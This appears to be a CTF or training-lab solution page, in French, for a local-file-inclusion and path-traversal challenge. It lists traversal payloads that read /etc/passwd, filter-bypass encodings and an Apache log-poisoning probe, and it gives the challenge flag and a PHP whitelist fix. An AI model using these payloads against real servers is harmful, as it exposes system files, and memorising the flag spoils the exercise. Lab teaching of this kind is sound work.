<h2 style="font-size:20px;color:#e4e8f0;margin-bottom:14px">C08 — LFI / Path Traversal</h2>
<div style="background:#1e1e2e;border-radius:8px;padding:16px;font-family:monospace;font-size:12px;color:#cdd6f4;line-height:2;white-space:pre-wrap">
<span style="color:#6c7086"># Indice 1 — Tester la traversal</span>
http://localhost/c08/?page=../../../etc/passwd
http://localhost/c08/?page=../../../flag

<span style="color:#6c7086"># Indice 2 — Encodage URL pour bypasser des filtres simples</span>
?page=..%2F..%2F..%2Fetc%2Fpasswd
?page=....//....//....//etc/passwd

<span style="color:#6c7086"># Indice 3 — Log poisoning (si PHP log accessible)</span>
?page=../../../var/log/apache2/access.log

<span style="color:#6c7086"># Flag</span>
<span style="color:#86efac">FLAG{lf1_p4th_tr4v3rs4l_r34d}</span>

<span style="color:#6c7086"># ✅ Correction</span>
$page = basename($_GET['page']);           // strip les ../
if (!in_array($page, $whitelist)) die();  // whitelist stricte
include("pages/" . $page . ".php");
</div>
